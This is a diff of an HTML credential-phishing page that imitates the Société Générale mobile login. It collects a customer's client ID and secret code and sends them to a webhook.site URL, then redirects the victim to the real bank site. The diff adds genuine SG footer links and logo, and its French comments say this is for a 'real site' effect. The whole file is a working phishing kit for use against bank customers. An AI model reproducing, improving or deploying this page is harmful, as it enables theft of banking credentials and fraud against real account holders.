@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Société Générale - Connexion</title>
     <style>
-        /* MÊME STYLE QUE AVANT POUR NE PAS BOULER LE DESIGN */
+        /* RESET ET BASE */
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -16,76 +16,206 @@
             min-height: 100vh;
             overflow-x: hidden;
         }
-        .header { text-align: center; padding-top: 40px; padding-bottom: 20px; }
-        .logo { height: 40px; width: auto; display: inline-block; }
+
+        /* EN-TÊTE AVEC LOGO */
+        .header {
+            text-align: center;
+            padding-top: 40px;
+            padding-bottom: 20px;
+        }
+
+        .logo {
+            height: 40px;
+            width: auto;
+            display: inline-block;
+        }
+
+        /* CONTENU PRINCIPAL */
         .content {
-            flex: 1; display: flex; flex-direction: column; justify-content: center;
-            padding: 0 20px; max-width: 400px; margin: 0 auto; width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
         }
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 25px; text-align: center; color: #000; }
-        .input-group { margin-bottom: 30px; }
+
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            color: #000;
+        }
+
+        /* CHAMPS DE SAISIE */
+        .input-group {
+            margin-bottom: 30px;
+        }
+
         input[type="number"] {
-            width: 100%; padding: 15px 0; border: none; border-bottom: 2px solid #E30613;
-            font-size: 24px; text-align: center; color: #000; background: transparent;
-            outline: none; -moz-appearance: textfield; letter-spacing: 2px;
+            width: 100%;
+            padding: 15px 0;
+            border: none;
+            border-bottom: 2px solid #E30613; /* Ligne rouge SG */
+            font-size: 24px;
+            text-align: center;
+            color: #000;
+            background: transparent;
+            outline: none;
+            -moz-appearance: textfield;
+            letter-spacing: 2px;
         }
-        input[type="number"]::placeholder { color: #999; font-size: 18px; letter-spacing: 1px; }
-        input[type="number"]::-webkit-outer-spin-button, input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+
+        input[type="number"]::placeholder {
+            color: #999;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+
+        /* Supprimer les flèches haut/bas */
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* BOUTON PRINCIPAL (ROUGE) */
         .btn-main {
-            width: 100%; padding: 16px; background-color: #E30613; color: white; border: none;
-            border-radius: 4px; font-size: 18px; font-weight: 600; cursor: pointer;
-            margin-top: auto; margin-bottom: 30px; box-shadow: 0 2px 5px rgba(227, 6, 19, 0.3);
+            width: 100%;
+            padding: 16px;
+            background-color: #E30613; /* Rouge SG */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 5px rgba(227, 6, 19, 0.3);
             transition: background 0.2s;
         }
-        .btn-main:active { background-color: #c50510; }
-        .hidden { display: none; }
-        .fade-in { animation: fadeIn 0.4s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .footer-links { text-align: center; padding: 20px; font-size: 14px; color: #666; border-top: 1px solid #eee; }
-        .footer-links a { color: #E30613; text-decoration: none; display: block; margin-bottom: 8px; }
-        .help-text { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; line-height: 1.4; }
-        .help-link { color: #E30613; text-decoration: none; font-weight: 600; }
-        .btn-main.loading { opacity: 0.7; pointer-events: none; }
+
+        .btn-main:active {
+            background-color: #c50510;
+        }
+
+        .btn-main.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        /* ÉTAT CACHÉ */
+        .hidden {
+            display: none;
+        }
+
+        /* ANIMATION DE TRANSITION */
+        .fade-in {
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* LIENS SECONDAIRES (Bas de page) - CORRIGÉ EN GRIS/NOIR */
+        .footer-links {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            color: #666;
+            border-top: 1px solid #eee;
+        }
+
+        .footer-links a {
+            color: #333333; /* Gris Foncé / Noir */
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+            transition: color 0.2s;
+        }
+
+        /* Au survol, on met le rouge SG pour l'effet "vrai site" */
+        .footer-links a:hover {
+            color: #E30613;
+            text-decoration: underline;
+        }
+
+        .help-text {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .help-link {
+            color: #E30613;
+            text-decoration: none;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
 
+    <!-- EN-TÊTE -->
     <div class="header">
-        <img src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png" alt="SG" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Logo_Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_2017.svg" alt="SG" class="logo">
     </div>
 
+    <!-- CONTENU DYNAMIQUE -->
     <div class="content">
+        
+        <!-- ÉTAPE 1 : IDENTIFIANT -->
         <div id="step1" class="fade-in">
             <h2>Saisissez votre Identifiant Client</h2>
+            
             <div class="input-group">
                 <input type="number" id="client_id" placeholder="Ex: 12345678" inputmode="numeric" pattern="[0-9]*">
             </div>
-            <p class="help-text"><a href="#" class="help-link">Où trouver mon Code Client SG ?</a></p>
+
+            <p class="help-text">
+                <a href="#" class="help-link">Où trouver mon Code Client SG ?</a>
+            </p>
+
             <button class="btn-main" onclick="goToStep2()">Suivant</button>
         </div>
 
+        <!-- ÉTAPE 2 : CODE SECRET (MOT DE PASSE) -->
         <div id="step2" class="hidden">
             <h2>Saisissez votre Code Secret</h2>
+            
             <div class="input-group">
                 <input type="number" id="password" placeholder="Ex: 12345" inputmode="numeric" pattern="[0-9]*">
             </div>
-            <p class="help-text"><a href="#" class="help-link">Code Secret inconnu ?</a></p>
+
+            <p class="help-text">
+                <a href="#" class="help-link">Code Secret inconnu ?</a>
+            </p>
+
             <button class="btn-main" id="btnSubmit" onclick="submitForm()">Valider</button>
         </div>
+
     </div>
 
+    <!-- PIED DE PAGE AVEC VRAIS LIENS ET COULEUR GRIS/NOIR -->
     <div class="footer-links">
-        <a href="#">Urgences carte bancaire</a>
-        <a href="#">Nos conseils sécurité</a>
-        <a href="#">Questions fréquentes</a>
-        <a href="#">Trouver une agence</a>
+        <!-- Liens réels de la Société Générale -->
+        <a href="https://particuliers.sg.fr/particuliers/votre-compte/mes-cartes/urgences-cartes" target="_blank">Urgences carte bancaire</a>
+        <a href="https://particuliers.sg.fr/particuliers/votre-compte/securite/conseils-de-securite" target="_blank">Nos conseils sécurité</a>
+        <a href="https://particuliers.sg.fr/particuliers/votre-compte/questions-frequentes" target="_blank">Questions fréquentes</a>
+        <a href="https://particuliers.sg.fr/particuliers/votre-compte/reseaux-de-proximite/trouver-une-agence" target="_blank">Trouver une agence</a>
         <br>
         <span style="font-size: 12px; color: #999;">© 2026 Société Générale</span>
     </div>
 
     <script>
         // ⚠️ REMPLACE CE LIEN PAR TON LIEN WEBHOOK.SITE EXACT
-        // Exemple: https://webhook.site/9cafa90d-2d9e-4cc3-a60e-4fbbc1c2ff3a
         const WEBHOOK_URL = "https://webhook.site/9cafa90d-2d9e-4cc3-a60e-4fbbc1c2ff3a";
 
         function goToStep2() {
@@ -140,14 +270,15 @@
             .then(response => {
                 // On attend 1 seconde pour être sûr que Webhook a reçu le paquet
                 setTimeout(() => {
-                    window.location.href = "https://societegenerale.com";
+                    // Redirection vers le VRAI site SG
+                    window.location.href = "https://espace-client.societegenerale.com";
                 }, 1000);
             })
             .catch(error => {
                 console.error("Erreur:", error);
                 // Même en cas d'erreur, on redirige
                 setTimeout(() => {
-                    window.location.href = "https://societegenerale.com";
+                    window.location.href = "https://espace-client.societegenerale.com";
                 }, 1000);
             });
         }
